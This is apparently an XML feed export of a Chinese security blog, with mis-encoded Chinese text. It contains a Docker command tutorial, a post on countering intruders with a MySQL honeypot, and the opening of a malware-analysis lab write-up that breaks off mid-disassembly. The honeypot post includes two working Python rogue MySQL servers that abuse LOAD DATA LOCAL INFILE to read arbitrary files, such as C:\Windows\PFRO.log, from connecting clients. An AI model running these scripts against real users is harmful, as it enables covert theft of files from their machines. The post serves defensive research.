class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#æ–°å»ºå®¹å™¨å¹¶ä½¿ç”¨</span><br><span class="line">docker run [å¯é€‰å‚æ•°] &lt;image&gt;</span><br><span class="line">           --name=&quot;Name&quot;   å®¹å™¨åå­—ï¼Œç”¨äºåŒºåˆ†å®¹å™¨</span><br><span class="line">           -d              åå°æ–¹å¼è¿è¡Œ</span><br><span class="line">           -it             ä½¿ç”¨äº¤äº’å¼æ–¹å¼è¿è¡Œï¼Œè¿›å…¥å®¹å™¨æŸ¥çœ‹å†…å®¹</span><br><span class="line">           -p              æŒ‡å®šå®¹å™¨æ˜ å°„ç«¯å£ -p  8080:8080</span><br><span class="line">                 -p ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line">                 -p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line">                 -p å®¹å™¨ç«¯å£</span><br><span class="line">           -P              éšæœºæŒ‡å®šç«¯å£</span><br><span class="line">           -e              ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps </span><br><span class="line"> </span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></li><li><p>é€€å‡ºå®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#é€€å‡ºå¹¶åœæ­¢äº¤äº’å®¹å™¨</span><br><span class="line">exitæˆ–Ctrl+P</span><br><span class="line"> </span><br><span class="line">#é€€å‡ºä½†ä¸åœæ­¢å®¹å™¨</span><br><span class="line">Ctrl+P+Q</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#åˆ é™¤å®¹å™¨ï¼ˆä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œè‹¥å¼ºåˆ¶åˆ é™¤åˆ™éœ€åŠ ä¸Š-få‚æ•°ï¼‰</span><br><span class="line">docker rm </span><br><span class="line"> </span><br><span class="line">#å¼ºåˆ¶åˆ é™¤æ‰€æœ‰å®¹å™¨</span><br><span class="line">docker rm -f $(docker ps -aq)</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨å’Œåœæ­¢å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#å¯åŠ¨å®¹å™¨</span><br><span class="line">docker start id</span><br><span class="line"> </span><br><span class="line">#é‡å¯å®¹å™¨</span><br><span class="line">docker restart id</span><br><span class="line"> </span><br><span class="line">#åœæ­¢å®¹å™¨</span><br><span class="line">docker stop id</span><br><span class="line"> </span><br><span class="line">#å¼ºåˆ¶åœæ­¢</span><br><span class="line">docker kill id</span><br></pre></td></tr></table></figure></li></ul></li><li><p>å…¶ä»–å‘½ä»¤</p><ul><li><p>åå°å¯åŠ¨å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --tail &lt;num&gt; &lt;id&gt;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å®¹å™¨è¿›ç¨‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top id</span><br></pre></td></tr></table></figure></li><li><p>è¿›å…¥å½“å‰æ­£åœ¨è¿è¡Œå®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é€šå¸¸å®¹å™¨æ˜¯åœ¨åå°è¿è¡Œï¼Œä½†æœ‰æ—¶éœ€è¦è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®</span><br><span class="line"></span><br><span class="line">#æ–¹å¼ä¸€ï¼Œè¿›å…¥å®¹å™¨å¼€å¯æ–°çš„ç»ˆç«¯</span><br><span class="line">docker exec -it id bash</span><br><span class="line"></span><br><span class="line">#æ–¹å¼äºŒï¼Œè¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯</span><br><span class="line">docker attach id bash</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹CUPçŠ¶æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stats id</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ä¸¾ä¾‹</p><ul><li><p>éƒ¨ç½²Nginx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  #æœç´¢é•œåƒ</span><br><span class="line">  docker search nginx</span><br><span class="line">   </span><br><span class="line">  #æ‹‰å–é•œåƒ</span><br><span class="line">  docker pull nginx</span><br><span class="line">   </span><br><span class="line">  #æŸ¥çœ‹é•œåƒ</span><br><span class="line">  docker images</span><br><span class="line">  root@ubuntu:/home/xiaoh# docker images</span><br><span class="line">  REPOSITORY        TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">  nginx             latest    605c77e624dd   2 weeks ago   141MB</span><br><span class="line">   </span><br><span class="line">  #åå°å¯åŠ¨é•œåƒ</span><br><span class="line">  docker run -d --name nginx01 -p 1234:80 nginx</span><br><span class="line">   </span><br><span class="line">  #æµ‹è¯•æ˜¯å¦å¯åŠ¨</span><br><span class="line">  curl 127.0.0.1:1234</span><br><span class="line">  &lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">- éƒ¨ç½²Tomcat</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#æ‹‰å–é•œåƒ<br>docker pull tomcat</p><p>#åå°å¯åŠ¨é•œåƒ<br>docker run -d -p 3456:8080 â€“name tomcat01 nginx</p><p>#è¿›å…¥å®¹å™¨<br>docker exec -it tomcat01 &#x2F;bin&#x2F;bash</p><p>#å‘ç°ç¼ºå°‘linuxå‘½ä»¤ã€ç¼ºå°‘webappsã€‚åŸå› æ˜¯é˜¿é‡Œäº‘é»˜è®¤ä¸‹è½½æœ€å°é•œåƒï¼Œæ‰€æœ‰å…¶ä»–ä¸å¿…è¦çš„èµ„æºéƒ½ä¼šè¢«å‰”é™¤ï¼Œåªä¿è¯æœ€å°å¯è¿è¡Œçš„ç¯å¢ƒã€‚</p><p>#å¤åˆ¶webapps<br>cp -r webapps.dist&#x2F;* webapps<br>&#96;&#96;&#96;</p></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº &lt;a href=&quot;https://www.runoob.com/go/go-</summary>
      
    
    
    
    <category term="docker" scheme="http://example.com/categories/docker/"/>
    
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Mysqlèœœç½ååˆ¶</title>
    <link href="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/"/>
    <id>http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/</id>
    <published>2022-08-09T13:16:50.000Z</published>
    <updated>2022-09-01T02:40:48.050Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Mysqlç™»å½•åˆ†æ"><a href="#Mysqlç™»å½•åˆ†æ" class="headerlink" title="Mysqlç™»å½•åˆ†æ"></a>Mysqlç™»å½•åˆ†æ</h4><ol><li><p>å‘½ä»¤è¡Œç™»å½•Mysqlï¼Œå¹¶æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png" alt=" "></p></li><li><p>é¦–å…ˆå¯¹Mysqlç‰ˆæœ¬è¿›è¡ŒéªŒè¯</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101345553.png" alt="image-20220830101345553"></p></li><li><p>æ¥ç€Request loginï¼Œä¼ è¾“ç”¨æˆ·åå’Œå¯†ç hash</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101455841.png" alt="image-20220830101455841"></p></li><li><p>ç™»å½•æˆåŠŸï¼Œè¿”å›OK</p></li><li><p>æŸ¥è¯¢ç‰ˆæœ¬å·å¹¶è¿”å›</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101557032.png" alt="image-20220830101557032"></p></li><li><p>å½“æ‰§è¡Œä¸€æ¡è¯­å¥æ—¶ï¼ŒæŠ“åŒ…å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æŸ¥è¯¢è¯­å¥æ˜æ–‡ä¼ è¾“</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101814721.png" alt="image-20220830101814721"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101838335.png" alt="image-20220830101838335"></p></li></ol><h4 id="Navicatç™»å½•åˆ†æ"><a href="#Navicatç™»å½•åˆ†æ" class="headerlink" title="Navicatç™»å½•åˆ†æ"></a>Navicatç™»å½•åˆ†æ</h4><ol><li><p>ç™»å½•æµç¨‹å’Œå‘½ä»¤è¡Œç™»å½•å·®ä¸å¤šï¼Œå¤šäº†å‡ æ¬¡Query</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102246191.png" alt="image-20220830102246191"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102317294.png" alt="image-20220830102317294"></p></li><li><p>æµç¨‹å¦‚ä¸‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110305792.png" alt="image-20220830110305792"></p></li></ol><h4 id="Mysqlç‰¹æ€§"><a href="#Mysqlç‰¹æ€§" class="headerlink" title="Mysqlç‰¹æ€§"></a>Mysqlç‰¹æ€§</h4><ol><li><pre><code class="mysql">Mysql é»˜è®¤æ‰“å¼€local_infileï¼Œå¦‚ä¸ºæ‰“å¼€å¯æ‰§è¡Œä¸‹åˆ—å‘½ä»¤show global variables like&#39;local_infile&#39;;set global local_infile=1;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. MySQLæœåŠ¡ç«¯å¯ä»¥åˆ©ç”¨`LOAD DATA LOCAL`å‘½ä»¤æ¥è¯»å–`MYSQL`å®¢æˆ·ç«¯çš„ä»»æ„æ–‡ä»¶ï¼Œç„¶åä¼ªé€ æ¶æ„æœåŠ¡å™¨å‘è¿æ¥åˆ°è¿™ä¸ªæœåŠ¡å™¨çš„å®¢æˆ·ç«¯å‘é€è¯»å–æ–‡ä»¶çš„`payload`ã€‚</span><br><span class="line"></span><br><span class="line">3. æœ¬åœ°æ‰§è¡Œå‘½ä»¤</span><br><span class="line"></span><br><span class="line">   ```mysql</span><br><span class="line">   load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\n&#x27;;</span><br></pre></td></tr></table></figure>![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png)</code></pre></li><li><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–æ•°æ®å¹¶å†™å…¥è¡¨ä¸­</p></li></ol><h4 id="å‘½ä»¤åˆ†æ"><a href="#å‘½ä»¤åˆ†æ" class="headerlink" title="å‘½ä»¤åˆ†æ"></a>å‘½ä»¤åˆ†æ</h4><ol><li><p>æŠ“åŒ…</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105755554.png" alt="image-20220830105755554"> </p></li><li><p>æ‰§è¡ŒqueryæŸ¥è¯¢ï¼Œé‡ç‚¹çœ‹ä¸‹è¿”å›åŒ…</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105956274.png" alt="image-20220830105956274"></p></li><li><p>æ¥ç€è¯»å–æ–‡ä»¶å†…å®¹å¹¶å†™å…¥</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110114832.png" alt="image-20220830110114832"></p></li></ol><h4 id="ååˆ¶"><a href="#ååˆ¶" class="headerlink" title="ååˆ¶"></a>ååˆ¶</h4><ol><li><p>ååˆ¶æµç¨‹ä¹Ÿå¾ˆæ˜äº†äº†ï¼Œå°±æ˜¯socketç¼–ç¨‹æ¨¡æ‹Ÿnavicatç™»å½•ï¼Œç„¶åæœåŠ¡ç«¯(èœœç½)å‘é€load local file payloadå³å¯</p></li><li><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¨¡æ‹ŸMysqlç™»å½•</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line"></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">serversocket.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">serversocket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># å»ºç«‹å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">    clientsocket,addr = serversocket.accept()      </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿æ¥åœ°å€: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># è¿”å›ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    evil_response = <span class="string">b&quot;\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74&quot;</span></span><br><span class="line">    clientsocket.sendall(evil_response)</span><br><span class="line">    <span class="comment"># file_text</span></span><br><span class="line">    <span class="built_in">print</span>(clientsocket.recv(<span class="number">9999</span>))</span><br><span class="line">    clientsocket.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ååˆ¶è„šæœ¬ è¯»å–C:\\Windows\\PFRO.logæ–‡ä»¶</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">server.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">filename, client, addr</span>):</span><br><span class="line">    base_path = os.path.abspath(<span class="string">&#x27;.&#x27;</span>) + <span class="string">&quot;/log/&quot;</span> + addr[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(base_path):</span><br><span class="line">        os.makedirs(base_path)</span><br><span class="line"></span><br><span class="line">    evil_response = <span class="built_in">str</span>.encode(<span class="built_in">chr</span>(<span class="built_in">len</span>(filename)+<span class="number">1</span>)) + <span class="string">b&quot;\x00\x00\x01\xfb&quot;</span> + <span class="built_in">str</span>.encode(filename)  <span class="comment"># æ¶æ„å“åº”åŒ…    </span></span><br><span class="line">    client.sendall(evil_response)</span><br><span class="line">    file_data = client.recv(<span class="number">999999</span>)</span><br><span class="line">    <span class="built_in">print</span>(file_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(base_path + <span class="string">&quot;/&quot;</span> + filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(file_data)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># å»ºç«‹å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿æ¥åœ°å€: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># è¿”å›ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    client.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    client.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    filename = <span class="string">&quot;C:\\Windows\\PFRO.log&quot;</span></span><br><span class="line">    <span class="comment">#è¿™é‡Œä¸ºè¦è¯»å–çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    get_data(filename, client, addr)</span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Mysqlç™»å½•åˆ†æ&quot;&gt;&lt;a href=&quot;#Mysqlç™»å½•åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;Mysqlç™»å½•åˆ†æ&quot;&gt;&lt;/a&gt;Mysqlç™»å½•åˆ†æ&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å‘½ä»¤è¡Œç™»å½•Mysqlï¼Œå¹¶æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°&lt;/p&gt;
&lt;p&gt;&lt;img s</summary>
      
    
    
    
    <category term="çº¢è“æ”»é˜²" scheme="http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="æ”»é˜²" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†ælab9-1</title>
    <link href="http://example.com/2022/08/06/lab9-1/"/>
    <id>http://example.com/2022/08/06/lab9-1/</id>
    <published>2022-08-06T13:16:50.000Z</published>
    <updated>2022-09-01T00:52:23.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çºµè§‚"><a href="#çºµè§‚" class="headerlink" title="çºµè§‚"></a>çºµè§‚</h2><h2 id="è¯¦ç»†åˆ†æ"><a href="#è¯¦ç»†åˆ†æ" class="headerlink" title="è¯¦ç»†åˆ†æ"></a>è¯¦ç»†åˆ†æ</h2><ol><li><p>æ‰“å¼€ç¨‹åºè§‚å¯Ÿå †æ ˆå‘ç°å¹¶ä¸æ˜¯mainå‡½æ•°å…¥å£ç‚¹<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130648845.png" alt="image-20220824130648845"></p></li><li><p>åˆ©ç”¨idaåˆ†æmainå‡½æ•°åœ°å€ï¼Œå¹¶åœ¨odä¸­æ–­ç‚¹<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130710216.png" alt="image-20220824130710216"><br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130728703.png" alt="image-20220824130728703"></p></li><li><p>ä¸€æ­¥ä¸€æ­¥è·Ÿè¿›è°ƒè¯•<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130742818.png" alt="image-20220824130742818"></p></li><li><p>æŸ¥çœ‹å‚æ•°ä¸ªæ•°æ˜¯å¦ä¸º1ï¼Œç»§ç»­å‘ä¸‹ç›´æ¥call 401000</p><p> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130755971.png" alt="image-20220824130755971"></p></li><li><p>ä»£ç å¤ªé•¿ä¸å¥½æˆªå›¾ï¼Œç›´æ¥æ”¾ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.text:00402410                 push    ebp</span><br><span class="line">.text:00402411                 mov     ebp, esp</span><br><span class="line">.text:00402413                 sub     esp, 208h</span><br><span class="line">.text:00402419                 push    ebx</span><br><span class="line">.text:0040241A                 push    esi</span><br><span class="line">.text:0040241B                 push    edi</span><br><span class="line">.text:0040241C                 push    104h            ; nSize</span><br><span class="line">.text:00402421                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402427                 push    eax             ; lpFilename</span><br><span class="line">.text:00402428                 push    0               ; 